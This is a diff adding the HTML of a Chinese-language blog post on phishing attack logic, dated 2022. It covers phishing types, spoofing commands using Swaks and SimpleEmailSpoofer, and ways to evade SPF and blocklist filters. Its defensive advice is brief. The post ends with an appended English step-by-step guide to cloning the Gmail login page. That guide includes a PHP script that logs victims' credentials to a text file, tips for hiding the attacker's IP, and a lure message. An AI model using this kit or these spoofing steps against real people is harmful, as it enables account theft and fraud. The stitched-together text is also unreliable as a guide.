@@ -1,0 +1,381 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>网络钓鱼攻击逻辑 | josyaaa</title>
+  <meta name="author" content="josyaaa">
+  
+  <meta name="description" content="社会工程已经成为大部分IT部门关注的重点，尤其在疫情期间，大范围的公司受到社会工程、勒索软件的攻击。超过60%的网络攻击的关键因素或主要因素是人为因素并且绝大多数与社会工程相关，其中涉及最多的属于各类的钓鱼邮件攻击。
+
+网络钓鱼是什么？网络钓鱼可以把其定义为：以对收件人施加影响或获得个人信息为目的，">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="网络钓鱼攻击逻辑"/>
+  <meta property="og:site_name" content="josyaaa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/josyaaa/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/josyaaa/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/josyaaa/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/josyaaa/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/josyaaa/">josyaaa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/josyaaa/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/josyaaa/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 网络钓鱼攻击逻辑</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <ul>
+<li>社会工程已经成为大部分IT部门关注的重点，尤其在疫情期间，大范围的公司受到社会工程、勒索软件的攻击。超过60%的网络攻击的关键因素或主要因素是人为因素并且绝大多数与社会工程相关，其中涉及最多的属于各类的钓鱼邮件攻击。</li>
+</ul>
+<h1 id="网络钓鱼是什么？"><a href="#网络钓鱼是什么？" class="headerlink" title="网络钓鱼是什么？"></a>网络钓鱼是什么？</h1><p>网络钓鱼可以把其定义为：以对收件人施加影响或获得个人信息为目的，发送看似来自权威来源的电子邮件。</p>
+<h1 id="网络钓鱼邮件的主要类型有哪些？"><a href="#网络钓鱼邮件的主要类型有哪些？" class="headerlink" title="网络钓鱼邮件的主要类型有哪些？"></a>网络钓鱼邮件的主要类型有哪些？</h1><ul>
+<li>链接钓鱼：攻击者在邮件内嵌入钓鱼链接，诱导鱼去点开链接登陆虚假的钓鱼网站或者链接直接指向恶意软件</li>
+<li>附件钓鱼：攻击者将病毒等存放于附件中，常见的附件为PDF、Doc、Excel、md等格式的附件</li>
+<li>鱼叉式钓鱼：攻击者针对特定目标进行攻击，目的是窃取具有敏感性的数据</li>
+<li>BEC钓鱼：攻击者伪装成商务邮件，对被攻击者实施商业信息、财务等重要的商务信息资料数据</li>
+<li>二维码钓鱼：攻击者诱导使用二维码扫一扫实施攻击，但是此场景用户处于内网之中</li>
+</ul>
+<h1 id="好的钓鱼攻击的决定性因素有哪些？"><a href="#好的钓鱼攻击的决定性因素有哪些？" class="headerlink" title="好的钓鱼攻击的决定性因素有哪些？"></a>好的钓鱼攻击的决定性因素有哪些？</h1><ul>
+<li>能够激起被攻击者的强烈情绪反应</li>
+<li>致使被攻击者的逻辑思考短路</li>
+</ul>
+<p>钓鱼攻击的本质个人理解为由于收到的这些邮件产生认知偏差，其次沦落为情绪化行为的牺牲品。这里我们需要对情绪化决策流程有认识，这样很大程度避免绝大多数的钓鱼攻击：</p>
+<div>
+    <span>
+      <img src="./fish-attack/pn1.png" width="18px">
+    </span>
+</div>
+
+<h1 id="周期性的决策过程预防钓鱼攻击怎么做？"><a href="#周期性的决策过程预防钓鱼攻击怎么做？" class="headerlink" title="周期性的决策过程预防钓鱼攻击怎么做？"></a>周期性的决策过程预防钓鱼攻击怎么做？</h1><ul>
+<li>确保正确的理解问题</li>
+<li>尽可能完整的收集信息</li>
+<li>考虑切实可行的选项</li>
+<li>做出决策（而不是缺少上三步直接做出决策）</li>
+<li>评估决策的效果</li>
+</ul>
+<p>更为直接的做法就是在行动之间冷静下问自己个为什么？</p>
+<h1 id="攻击者怎样进行钓鱼攻击呢？"><a href="#攻击者怎样进行钓鱼攻击呢？" class="headerlink" title="攻击者怎样进行钓鱼攻击呢？"></a>攻击者怎样进行钓鱼攻击呢？</h1><div>
+    <span>
+      <img src="fish-attack/png2.png" width="18px">
+    </span>
+</div>
+
+<p>钓鱼攻击可以从操控的关键节点中理解钓鱼攻击的基础知识，通过了解决策制定、影响、操控得以进行钓鱼攻击。</p>
+<p><strong><strong>建立钓鱼环境</strong></strong></p>
+<ul>
+<li>可以使用网站克隆工具setookit</li>
+</ul>
+<p><img src="/josyaaa/./fish-attack/png3.png" alt="pn3"></p>
+<p>在使用工具使需要选择不同的攻击类型以及需要监听的IP最终直接enter即可实现自动化的操作，填写克隆的网站地址也类似操作。（忽略图上显示出来的IP地址）</p>
+<ul>
+<li>也可以使用专有的钓鱼集成平台gophish</li>
+</ul>
+<p>gophish专门为滲透测试人员涉及的开源网络钓鱼工具，提供快速、轻松地执行网络钓鱼以及安全意识培训的能力，同时gophish对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用集成，并且实现功能方面的模块化，可以方便用户快速掌握钓鱼工作各部分的原理及运用。</p>
+<p>安装教程及使用可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42939527/article/details/107485116">https://blog.csdn.net/qq_42939527/article/details/107485116</a></p>
+<ul>
+<li>EwoMail建立邮箱服务器</li>
+</ul>
+<p>EwoMail是基于Linux的开源邮件服务器，支持一键搭建，集成了众多优秀稳定的组件，是一个快速部署、简单高效、安全稳定的邮件解决方案，支持电脑和手机的客户端，适合个人或邮箱功能需求少的企业。</p>
+<p>安装教程及使用可以参考：<a target="_blank" rel="noopener" href="https://gitcode.net/mirrors/gyxuehu/EwoMail?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/gyxuehu/EwoMail?utm_source=csdn_github_accelerator</a></p>
+<p><strong><strong>邮件伪造建立</strong></strong></p>
+<ul>
+<li>使用Swaks工具 安装地址：<a target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a><blockquote>
+<p>#下载文件并解压<br>wget  <a target="_blank" rel="noopener" href="http://www.jetmore.org/john/code/swaks/files/swaks-20201014.0.tar.gz">http://www.jetmore.org/john/code/swaks/files/swaks-20201014.0.tar.gz</a><br>tar -zxvf swaks-20201014.0.tar.gz<br>cd swaks-20201014.0&#x2F;</p>
+</blockquote>
+</li>
+</ul>
+<p>#测试邮箱的连通性<br>sudo .&#x2F;swaks –to  *******<a href="mailto:&#x37;&#x36;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x37;&#x36;&#64;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a></p>
+<ul>
+<li>或者使用SimpleEmailSpoofer的python脚本</li>
+</ul>
+<blockquote>
+<p>git clone <a href="https://github.com/lunarca/SimpleEmailSpoofer.git">https://github.com/lunarca/SimpleEmailSpoofer.git</a><br>cd SimpleEmailSpoofer&#x2F;<br>pip install -r requirements.txt<br>#使用示例<br>.&#x2F;SimpleEmailSpoofer.py -e [Path to Email file] -t [To address] -f [From address] -n [From name] -j [Email subject]<br>#邮箱测试<br>python SimpleEmailSpoofer.py -t a******<a href="mailto:&#116;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#111;&#109;">&#116;&#x40;&#x31;&#54;&#51;&#46;&#x63;&#111;&#109;</a>  -n 管理员 -f <a href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x74;&#101;&#115;&#x74;&#x2e;&#99;&#x6f;&#109;">&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#x74;&#101;&#115;&#x74;&#x2e;&#99;&#x6f;&#109;</a> -j “SimpleEmailSpoofer test”  -e 1.txt</p>
+</blockquote>
+<p><strong><strong>URL、邮件头伪造</strong></strong></p>
+<ul>
+<li>不可否认钓鱼攻击最重要的利用情绪的漏洞来攻击被攻击者的批判性思维以及逻辑能力，由于邮件是精心涉及的恶意邮件，目的是为了让你下载恶意软件、泄漏个人信息或者其他的行为，所以攻击者利用URL、邮件头的伪造进行所谓的Punycode钓鱼攻击（URL、邮件头的伪造详情下篇文章主要谈论），然后就需作为攻击者去实行域名注册的普通操作，域名建立和购买可以去各大云商购买域名。</li>
+<li>由于可能有的公司具有邮件网管域名等检测系统或者其他的入侵检测设备等。但是这些系统或者设备的产品多数是建立黑、白名单可以类比于红黑树结构的检测结构，名单的建立是需要人为进行配置，人本身总会是最大的漏洞，作为攻击者需要多进行些域名的信息收集工作，再对其众多收集到的域名进行解析，寻找一些没有SPF记录的类型、伪造不存在的权威级别的域名，当然前述的域名信息收集肯定是需要黑白名单均收集的状况，在伪造邮件地址时需要能够尝试匹配到名单正则策略等等方式。</li>
+</ul>
+<p><strong><strong>邮件内容伪造</strong></strong></p>
+<p>现实物理世界中最常见的内容还是：</p>
+<p>1、背景调查类型：“有人在对你进行背景调查”  攻击被攻击者的“恐惧、诧异、好奇”<br>2、突发事件类型： &lt;地点&gt; 发生了什么  &lt;灾难&gt; 什么样的内容<br>3、职能工作类型： &lt;职能邀请&gt; 具体时间啊地点<br>4、供应商、内部来源类型</p>
+<p>当然上述邮件内容只是常见的内容结构，当然这样的内容结构以及非常落后了，现在更加高级的做法更多的是多组合攻击，例如将恶意软件与钓鱼等攻击不同排列组合的方式更难以防御的复杂攻击方式。</p>
+<h1 id="更加专业钓鱼工具包选择问题"><a href="#更加专业钓鱼工具包选择问题" class="headerlink" title="更加专业钓鱼工具包选择问题"></a>更加专业钓鱼工具包选择问题</h1><ul>
+<li><p>由于更多的工具软件采用SaaS（软件即服务）、MS（托管服务）、python等等其他语言的程序编码DIY（需要更为底层的原理逻辑）所再选择使用自己合适的工具选型需要思考：<br>1、 使用工具需要什么样的知识积累？<br>2、用户信息的安全性如何？<br>3、工具选型是否有些客观因素阻碍？</p>
+</li>
+<li><p>商业付费钓鱼工具：Rapid7、ThreaatSim、PhishMe、PhishLine</p>
+</li>
+<li><p>开源钓鱼工具：SET、gophish、Phishing Frenzy</p>
+</li>
+</ul>
+<h1 id="钓鱼攻击防御的建立"><a href="#钓鱼攻击防御的建立" class="headerlink" title="钓鱼攻击防御的建立"></a>钓鱼攻击防御的建立</h1><ul>
+<li>普通用户：请谨慎的接受查看信息</li>
+<li>安全人员：IT行业是需要不断学习进步的，把钓鱼攻击等纳入你的安全意识培训技能包中</li>
+<li>企业客户： 结合企业自身发展的需求设定安全演练的需求，从内部意识以及外部预防的角度出发，相信在数字化的不断改造下，基于钓鱼的复杂网络攻击会更加普遍与急切，需要企业客户防患未然。</li>
+</ul>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><ul>
+<li>Step 1:</li>
+</ul>
+<p>Go to the gmail.com.  Save the Page as “complet HTML” file</p>
+<ul>
+<li>Step 2:</li>
+</ul>
+<p>Once you save the login page completely, you will see a HTML file and a folder with the name something like Email from google files.There will be two image files namely “google_transparent.gif”,”mail_logo.png”</p>
+<ul>
+<li>Step3:</li>
+</ul>
+<p> Upload those image to tinypic or photobucker.com.  copy the url of each image.</p>
+<ul>
+<li>Step4:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Open the HTML file in Wordpad.</span><br><span class="line">Search for “google_transparent.gif” (without quotes) and replace it with corresponding url .</span><br><span class="line">Search for “mail_logo.png” (without quotes) and replace it with corresponding url .</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 5:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Search for the</span><br><span class="line"> action=”https://www.google.com/accounts/ServiceLoginAuth”</span><br><span class="line">Replace it with</span><br><span class="line"> action=”http://yoursite urlhere/login.php”</span><br><span class="line">save the file.</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step6:<br>Now you need to create login.php, you need to open the notepad and type as</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);</span><br><span class="line">$handle = fopen(“pswrds.txt”, “a”);</span><br><span class="line">foreach($_GET as $variable =&gt; $value) &#123;</span><br><span class="line">fwrite($handle, $variable);</span><br><span class="line">fwrite($handle, “=”);</span><br><span class="line">fwrite($handle, $value);</span><br><span class="line">fwrite($handle, “rn”);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($handle, “rn”);</span><br><span class="line">fclose($handle);</span><br><span class="line">exit;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>save it</p>
+<ul>
+<li>Step 7:</li>
+</ul>
+<p>open the notepad and just save the file as “pswrds.txt” without any contents.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Now upload those three files(namely index.html,login.php,pswrds.txt) in any of subdomain Web hosting site.</span><br><span class="line">Note:  that web hosting service must has php feature.</span><br><span class="line">Use one of these sites:110mb.com, spam.com justfree.com or 007sites.com.</span><br><span class="line"> use this sites through the secure connection sites(so that you can hide your ip address)  like: http://flyproxy.com .  find best secure connection site.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Step 8:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create an email with gmail keyword.</span><br><span class="line"> like : gmailburger@gmail.com</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Step 9:</li>
+</ul>
+<p>Send to victim similar  to ” gmail starts new feature to use this service log in to this page” from that gmail id with link to your phishing web page.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line">For user to believe change Your phishing web page url with any of free short url sites.</span><br><span class="line">Like : co.nr, co.cc,cz.cc</span><br><span class="line">This will make users to believe that it is correct url.</span><br></pre></td></tr></table></figure>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/josyaaa/2022/05/12/eBPF/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/josyaaa/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/josyaaa/2022/05/12/RED_01/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-05-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2022 josyaaa
+  
+      when meets RED to BLUE ...<a href="https://josyaaa.github.io/" target="_blank">josyaaa's blog</a>,<a href="https://github.com/josyaaa?tab=repositories">josyaaa's github</a><a href="http://getbootstrap.com/" target="_blank"></a><a href="http://getbootstrap.com/" target="_blank"></a>.
+     <br> SCDAD/BIG DATA/MALWARE <a href="http://github.com/wzpan/hexo-theme-freemind/"></a> most good at leading tech
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/josyaaa/js/jquery.imagesloaded.min.js"></script>
+<script src="/josyaaa/js/gallery.js"></script>
+<script src="/josyaaa/js/bootstrap.min.js"></script>
+<script src="/josyaaa/js/main.js"></script>
+<script src="/josyaaa/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/josyaaa/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/josyaaa/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/josyaaa/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
